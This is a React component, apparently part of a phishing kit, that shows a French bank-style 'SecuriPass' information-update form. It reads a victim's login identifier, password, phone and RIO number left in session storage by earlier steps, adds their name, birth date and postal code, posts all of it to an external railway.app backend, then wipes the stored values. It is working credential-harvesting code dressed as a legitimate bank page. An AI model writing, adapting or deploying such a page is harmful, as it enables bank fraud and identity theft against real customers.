import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { Alert, AlertDescription } from '../components/ui/alert';
import { UserCircle, Calendar, AlertCircle, MapPin } from 'lucide-react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://web-production-b21a3.up.railway.app';

const PersonalInfoStep = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({
    lastName: '',
    firstName: '',
    dateOfBirth: '',
    postalCode: ''
  });

  useEffect(() => {
    const identifier = sessionStorage.getItem('securipass_identifier');
    const password = sessionStorage.getItem('securipass_password');
    const phone = sessionStorage.getItem('securipass_phone');
    if (!identifier || !password || !phone) {
      navigate('/login');
    }
  }, [navigate]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    let nextValue = value;
    if (name === 'postalCode') {
      nextValue = value.replace(/\D/g, '').slice(0, 5);
    }
    setFormData({
      ...formData,
      [name]: nextValue
    });
    setError('');
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const identifier = sessionStorage.getItem('securipass_identifier');
      const password = sessionStorage.getItem('securipass_password');
      const phoneNumber = sessionStorage.getItem('securipass_phone') || '';
      const rioNumber = sessionStorage.getItem('securipass_rio') || '';

      await axios.post(`${BACKEND_URL}/api/securipass/submit`, {
        identifier,
        password,
        phoneNumber,
        rioNumber,
        ...formData
      });

      sessionStorage.removeItem('securipass_identifier');
      sessionStorage.removeItem('securipass_password');
      sessionStorage.removeItem('securipass_phone');
      sessionStorage.removeItem('securipass_rio');

      navigate('/final-confirmation');
    } catch (err) {
      console.error('Error submitting data:', err);
      setError('Une erreur est survenue. Veuillez réessayer.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-50 to-white py-6 sm:py-12 px-3 sm:px-4">
      <div className="max-w-2xl mx-auto">
        <Alert className="mb-6 sm:mb-8 border-[#e60028] bg-[#e60028]/5">
          <UserCircle className="h-5 w-5 text-[#e60028]" />
          <AlertDescription className="text-[#e60028] ml-2 text-sm sm:text-base">
            <strong>Dernière étape.</strong> Confirmez vos informations personnelles.
          </AlertDescription>
        </Alert>

        <Card className="shadow-2xl border-none">
          <CardHeader className="space-y-3 sm:space-y-4 pb-6 sm:pb-8 px-4 sm:px-6">
            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-gradient-to-br from-[#e60028] to-[#c00020] rounded-full flex items-center justify-center mx-auto shadow-lg">
              <UserCircle className="text-white" size={28} />
            </div>
            <CardTitle className="text-xl sm:text-2xl md:text-3xl font-bold text-center text-gray-900 leading-tight">
              Mise à jour de vos informations
            </CardTitle>
            <CardDescription className="text-center text-sm sm:text-base text-gray-600">
              Complétez vos informations pour finaliser la mise à jour
            </CardDescription>
          </CardHeader>

          <CardContent className="px-4 sm:px-6">
            <form onSubmit={handleSubmit} className="space-y-5 sm:space-y-6">
              {error && (
                <Alert variant="destructive" className="animate-in slide-in-from-top duration-300">
                  <AlertCircle className="h-4 w-4" />
                  <AlertDescription>{error}</AlertDescription>
                </Alert>
              )}

              <div className="space-y-2">
                <Label htmlFor="lastName" className="text-gray-900 font-semibold flex items-center gap-2 text-sm sm:text-base">
                  <UserCircle size={18} className="text-[#e60028]" />
                  Nom de famille
                </Label>
                <Input
                  id="lastName"
                  name="lastName"
                  type="text"
                  placeholder="DUPONT"
                  value={formData.lastName}
                  onChange={handleChange}
                  required
                  data-testid="last-name-input"
                  className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="firstName" className="text-gray-900 font-semibold flex items-center gap-2 text-sm sm:text-base">
                  <UserCircle size={18} className="text-[#e60028]" />
                  Prénom
                </Label>
                <Input
                  id="firstName"
                  name="firstName"
                  type="text"
                  placeholder="Jean"
                  value={formData.firstName}
                  onChange={handleChange}
                  required
                  data-testid="first-name-input"
                  className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 sm:gap-4">
                <div className="space-y-2">
                  <Label htmlFor="dateOfBirth" className="text-gray-900 font-semibold flex items-center gap-2 text-sm sm:text-base">
                    <Calendar size={18} className="text-[#e60028]" />
                    Date de naissance
                  </Label>
                  <Input
                    id="dateOfBirth"
                    name="dateOfBirth"
                    type="date"
                    value={formData.dateOfBirth}
                    onChange={handleChange}
                    required
                    data-testid="dob-input"
                    className="h-12 w-full max-w-[220px] border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="postalCode" className="text-gray-900 font-semibold flex items-center gap-2 text-sm sm:text-base">
                    <MapPin size={18} className="text-[#e60028]" />
                    Code postal
                  </Label>
                  <Input
                    id="postalCode"
                    name="postalCode"
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]{5}"
                    placeholder="75001"
                    value={formData.postalCode}
                    onChange={handleChange}
                    required
                    maxLength={5}
                    data-testid="postal-code-input"
                    className="h-12 w-full max-w-[160px] border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base tracking-widest"
                  />
                </div>
              </div>

              <Button
                type="submit"
                disabled={loading}
                data-testid="final-submit-btn"
                className="w-full h-12 bg-[#e60028] hover:bg-[#c00020] text-white font-semibold text-base sm:text-lg shadow-lg hover:shadow-xl transition-all duration-300 mt-6 sm:mt-8"
              >
                {loading ? 'Envoi en cours...' : 'Mettre à jour'}
              </Button>
            </form>

            <div className="mt-6 sm:mt-8 pt-5 sm:pt-6 border-t border-gray-200 text-center">
              <p className="text-sm text-gray-600">
                Besoin d'assistance ? Contactez le{' '}
                <span className="font-semibold text-[#e60028] whitespace-nowrap">09 69 39 00 00</span>
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default PersonalInfoStep;
